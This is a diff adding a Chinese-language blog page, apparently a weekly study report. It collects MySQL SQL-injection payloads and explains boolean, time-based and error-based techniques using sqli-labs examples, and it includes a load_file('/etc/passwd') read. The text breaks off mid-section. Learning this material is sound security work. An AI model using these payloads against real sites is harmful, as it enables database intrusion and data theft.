@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="jax">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="jax">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>第六周：数据库相关注入语句的收集和学习 · jax&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >jax&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">第六周：数据库相关注入语句的收集和学习</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>jax's Studio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            第六周：数据库相关注入语句的收集和学习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">6.3k</span>Reading time: <span class="post-count reading-time">30 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/19</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="第六周：数据库相关注入语句的收集和学习"><a href="#第六周：数据库相关注入语句的收集和学习" class="headerlink" title="第六周：数据库相关注入语句的收集和学习"></a>第六周：数据库相关注入语句的收集和学习</h1><blockquote>
+<p>日期：2019-09-09</p>
+<p>作者：无风</p>
+<p>简介：数据库相关注入语句的收集和学习</p>
+</blockquote>
+<h2 id="0x01-任务要求"><a href="#0x01-任务要求" class="headerlink" title="0x01 任务要求"></a>0x01 任务要求</h2><p>1、收集网络上各种 sql 注入时使用的 payload 并理解其适用的环境（检测注入、利用注入）</p>
+<p>2、记录 sqlmap 的检测和利用过程中使用的 payload（也算一种 payload 收集方式）</p>
+<p>3、理解以上涉及的 sql 语句的意思，其中会涉及不同的数据库、不同注入场景，可以将学习的过程和收集的方式进行整理形成报告，关于 payload 的理解，其中会涉及之前学习的基础。</p>
+<p><strong>扩展学习：</strong>理解 sqlmap 自带 tamper 的原理，这里通常包含很多数据库的特性，从而实现 payload 变形啥的，用来绕过一些简单的安全检测</p>
+<h2 id="0x02-检测注入类型payload"><a href="#0x02-检测注入类型payload" class="headerlink" title="0x02 检测注入类型payload"></a>0x02 检测注入类型payload</h2><h3 id="2-1-BOOL-SQLINJECTION"><a href="#2-1-BOOL-SQLINJECTION" class="headerlink" title="2.1 BOOL SQLINJECTION"></a>2.1 BOOL SQLINJECTION</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">\</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">%df&apos;</span><br><span class="line">%df&quot;</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">&apos; and &apos;1&apos;=&apos;1</span><br><span class="line">&apos; and &apos;1&apos;=&apos;2</span><br><span class="line">&quot; and &quot;1&quot;=&quot;1</span><br><span class="line">&quot; and &quot;1&quot;=&quot;2</span><br><span class="line">) and (1=1</span><br><span class="line">) and (1=2</span><br><span class="line">&apos;) and (&apos;1&apos;=&apos;1</span><br><span class="line">&apos;) and (&apos;1&apos;=&apos;2</span><br><span class="line">%&apos; and 1=1 and &apos;%&apos;=&apos;</span><br><span class="line">%&apos; and 1=2 and &apos;%&apos;=&apos;x</span><br><span class="line">%&apos;) and 1=1 and (&apos;%&apos;=&apos;</span><br><span class="line">%&apos;) and 1=2 and (&apos;%&apos;=&apos;x</span><br><span class="line">OR 1=1</span><br><span class="line">OR 1=2</span><br><span class="line">&apos; OR 1=1-- -</span><br><span class="line">&apos; OR 1=2-- -</span><br><span class="line">) OR 1=1-- -</span><br><span class="line">) OR 1=2-- -</span><br><span class="line">&apos;) OR 1=1-- -</span><br><span class="line">&apos;) OR 1=2-- -</span><br><span class="line">&quot; OR &quot;1&quot;=&quot;1</span><br><span class="line">&quot; OR &quot;1&quot;=&quot;2</span><br><span class="line">&apos; OR &apos;1&apos;=&apos;1</span><br><span class="line">&apos; OR &apos;1&apos;=&apos;2</span><br><span class="line">) OR (1=1</span><br><span class="line">) OR (1=2</span><br><span class="line">&apos;) OR (&apos;1&apos;=&apos;1</span><br><span class="line">&apos;) OR (&apos;1&apos;=&apos;2</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-TIME-BASE-SQLINJECTION"><a href="#2-2-TIME-BASE-SQLINJECTION" class="headerlink" title="2.2 TIME-BASE SQLINJECTION"></a><strong>2.2 TIME-BASE SQLINJECTION</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &apos; and if(1=0,1, sleep(10)) --+    </span><br><span class="line"></span><br><span class="line">&quot; and if(1=0,1, sleep(10)) --+</span><br><span class="line"></span><br><span class="line">) and if(1=0,1, sleep(10)) --+</span><br><span class="line"></span><br><span class="line">&apos;) and if(1=0,1, sleep(10)) --+</span><br><span class="line"></span><br><span class="line">&quot;) and if(1=0,1, sleep(10)) --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-报错型注入"><a href="#0x03-报错型注入" class="headerlink" title="0x03 报错型注入"></a>0x03 报错型注入</h2><p><strong>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</strong></p>
+<h3 id="MYSQL报错注入大体可以分为以下几类"><a href="#MYSQL报错注入大体可以分为以下几类" class="headerlink" title="MYSQL报错注入大体可以分为以下几类"></a>MYSQL报错注入大体可以分为以下几类</h3><ul>
+<li><strong>BIGINT等数据类型溢出</strong></li>
+<li><strong>Xpath语法错误</strong></li>
+<li><strong>concat+rand()+group_by()导致主键重复</strong></li>
+<li><strong>数据库的一些特性</strong></li>
+</ul>
+<hr>
+<h3 id="3-1-BIGINT等数据类型溢出"><a href="#3-1-BIGINT等数据类型溢出" class="headerlink" title="3.1 BIGINT等数据类型溢出"></a>3.1 BIGINT等数据类型溢出</h3><blockquote>
+<p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况，在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 18446744073709551615+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(18446744073709551615 + 1)&apos;</span><br><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(~(0) + 1)&apos;</span><br></pre></td></tr></table></figure>
+
+<p><strong>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">     &gt; root@localhost</span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">     &gt; 1</span><br><span class="line">mysql&gt; select ~(select * from (select user())x);</span><br><span class="line">     &gt; 18446744073709551615</span><br></pre></td></tr></table></figure>
+
+<p> <strong>同理，利用exp函数也会产生类似的溢出错误：</strong>       </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</span><br><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(&apos;root@localhost&apos;)) - ~(0))&apos;</span><br><span class="line">mysql&gt; select (!(select * from (select user())x) - ~0);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not((select &apos;root@localhost&apos; from dual))) - ~(0))&apos;</span><br><span class="line">mysql&gt; select exp(~(select*from (select table_name from information_schema.tables limit 0,1)x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select &apos;CHARACTER_SETS&apos; from dual)))&apos;</span><br><span class="line">mysql&gt; select exp(~(select*from (select concat(table_schema,&apos;:&apos;,table_name) from information_schema.tables limit 0,1)x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select &apos;information_schema:CHARACTER_SETS&apos; from dual)))&apos;</span><br><span class="line">mysql&gt; select exp(~(select*from(select load_file(&apos;/etc/passwd&apos;))a));</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br></pre></td></tr></table></figure>
+
+<p>报错信息是有长度限制的，同时报错的信息跟MySQL版本、MySQL所在操作系统有关系。</p>
+<p><strong>几种形式的变种：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select !(select*from(select user())x)-~0;</span><br><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">mysql&gt; select (select!x-~0.from(select(select user())x)a);</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用这种基于BIGINT溢出错误的注入手法，我们可以几乎可以使用MySQL中所有的数学函数，如：ATAN、CEIL、FLOOR、HEX、RAND、IN、CEILING、TRUNCATE、TAN、SQRT、ROUND‘SIGN等函数：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select !atan((select*from(select user())a))-~0; </span><br><span class="line">mysql&gt; select !ceil((select*from(select user())a))-~0;</span><br><span class="line">mysql&gt; select !floor((select*from(select user())a))-~0;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注入案例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select (exp(~(select * FROM(SELECT USER())a))),2,3-- </span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select (!(select * from (select user())x) - ~0),2,3-- </span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select exp(~(select*from (select concat(table_schema,&apos;:&apos;,table_name) from information_schema.tables limit 0,1)x)),2,3-- </span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; and (exp(~(select * FROM(SELECT USER())a)))-- </span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; and exp(~(select*from (select concat(table_schema,&apos;:&apos;,table_name) from information_schema.tables limit 0,1)x))--</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-1-2-Xpath语法错误"><a href="#3-1-2-Xpath语法错误" class="headerlink" title="3.1.2 Xpath语法错误"></a>3.1.2 Xpath语法错误</h3><blockquote>
+<p>从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,&apos;/a/b&apos;);</span><br><span class="line">mysql&gt; select updatexml(1,&apos;/a/b&apos;,1);</span><br></pre></td></tr></table></figure>
+
+<p><strong>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.5.36-log~&apos;</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;</span><br><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~security~&apos;</span><br><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 0,1),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~CHARACTER_SETS~&apos;</span><br><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select concat(table_schema, &apos;:&apos;,table_name) from information_schema.tables limit 0,1),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~information_schema:CHARACTER_SE&apos;</span><br><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~emails,referers,uagents,users~&apos;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注入案例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- </span><br><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select concat(table_schema, &apos;:&apos;, table_name) from information_schema.tables limit 0,1),0x7e))-- </span><br><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),0x7e))-- </span><br><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; union select extractvalue(1,concat(0x7e,(select database()),0x7e)),2,3-- </span><br><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; union select extractvalue(1,concat(0x7e,(select concat(table_schema, &apos;:&apos;, table_name) from information_schema.tables limit 0,1),0x7e)) ,2, 3 -- </span><br><span class="line">http://192.168.100.8/sqli-labs/Less-5/?id=1&apos; union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),0x7e)),2,3--</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：extractvalue()和updatexml()报错信息是有长度限制的，最大长度限制32位</strong></p>
+<h3 id="3-1-3-concat-rand-group-by-导致主键重复"><a href="#3-1-3-concat-rand-group-by-导致主键重复" class="headerlink" title="3.1.3 concat+rand()+group_by()导致主键重复"></a>3.1.3 concat+rand()+group_by()导致主键重复</h3><blockquote>
+<p>这里利用到了count()和group by在遇到rand()产生的重复值时报错，错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from users group by floor(rand(0)*2);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;1&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>
+
+<p><strong>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</strong></p>
+<blockquote>
+<p>MySQL官方：查询的时候如果使用rand()的话，该值会被计算多次，在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，最终会导致主键重复错误产生。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from users group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.5.36-log1&apos; for key &apos;group_key&apos;</span><br><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.5.36-log1&apos; for key &apos;group_key&apos;</span><br><span class="line">mysql&gt; select count(*) from users group by concat((select table_name from information_schema.tables limit 0,1),&apos;:&apos;,floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;CHARACTER_SETS:1&apos; for key &apos;group_key&apos;</span><br><span class="line">mysql&gt; select count(*),concat((select table_name from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x; </span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;CHARACTER_SETS1&apos; for key &apos;group_key&apos;</span><br><span class="line">mysql&gt; select count(*) from information_schema.tables group by concat((select concat(table_schema,&apos;:&apos;,table_name) from information_schema.tables limit 0,1),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;information_schema:CHARACTER_SETS1&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注入实例：</strong></p>
